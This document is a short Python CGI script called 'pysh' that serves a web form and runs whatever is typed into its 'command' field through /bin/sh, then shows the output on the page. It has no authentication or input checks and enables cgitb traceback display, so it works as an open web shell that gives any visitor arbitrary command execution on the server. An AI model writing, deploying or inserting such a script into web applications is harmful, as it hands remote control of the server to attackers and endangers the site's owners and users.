#!/usr/bin/env python

import cgi, shlex, subprocess
import cgitb; cgitb.enable()  # for troubleshooting
from subprocess import Popen, PIPE, STDOUT

print "Content-type: text/html"
print

print """
<html>

<head><title>pysh</title></head>

<body>
"""

form = cgi.FieldStorage()
command = form.getvalue("command", "")

p = Popen(['/bin/sh'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)

print """
  <div><pre>$ %s</pre></div>
  <div> 
    <form>
      <p>$ <input type="text" name="command"/></p>
    </form>
  </div>

</body>

</html>
""" % p.communicate(command)[0]

